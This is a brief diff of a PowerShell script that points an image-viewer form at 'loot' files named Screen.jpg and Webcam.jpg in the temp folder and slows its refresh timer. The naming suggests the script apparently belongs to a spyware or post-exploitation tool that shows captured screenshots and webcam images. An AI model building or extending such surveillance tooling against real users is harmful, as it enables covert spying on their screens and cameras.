@@ -517,15 +517,15 @@ $imageForm = $null
 $pictureBox1 = $null
 $pictureBox2 = $null
 
-$imagePath1 = "$env:TEMP\Img1.jpg"
-$imagePath2 = "$env:TEMP\Img2.jpg"
+$imagePath1 = "$env:TEMP\loot\Screen.jpg"
+$imagePath2 = "$env:TEMP\loot\Webcam.jpg"
 $form, $pictureBox1, $pictureBox2 = Create-ImageForm -imagePath1 $imagePath1 -imagePath2 $imagePath2
 
 $form.Add_Shown({ $form.Activate() })
 $form.Show()
 
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 5000
+$timer.Interval = 10000
 
 $timer.Add_Tick({
     try {
